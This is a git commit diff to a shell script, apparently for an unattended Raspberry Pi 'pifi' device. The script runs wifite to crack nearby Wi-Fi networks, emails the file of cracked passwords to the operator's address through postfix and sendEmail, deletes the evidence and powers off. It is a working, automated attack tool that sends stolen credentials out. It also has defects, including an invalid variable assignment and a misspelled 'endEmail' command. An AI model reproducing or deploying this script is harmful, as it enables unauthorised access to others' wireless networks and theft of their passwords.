ed58b4d8588fc437f16d46d1c21026eab74ff462
Hariss Ali Gills <harissgills@gmail.com>
2022-01-29 01:58:25 +0000

    Emails now send

--- script.sh
+++ script.sh
@@ -1,14 +1,17 @@
-#!/bin/sh
+#!/usr/bin/sh
 sleep 30s
 wifite -p 60 --kill
+wifite --cracked
 systemctl start postfix
+sleep 30S
 my_address = username@email.com
-if [ ! -f cracked.json]
+if [ -f "cracked.json" ]
 then
-	sendEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
-else 
     sendEmail -f pifi@attcking.pi -t $my_address -u "Pa$$W0RD$" -a cracked.json
+    rm cracked.json
+else
+    endEmail -f pifi@attcking.pi -t $my_address -u "Unsuccessful Attack" -m "Plug the pi into power supply to retry."
 fi
+sleep 30s
 systemctl stop postfix
-rm cracked.json
 shutdown now
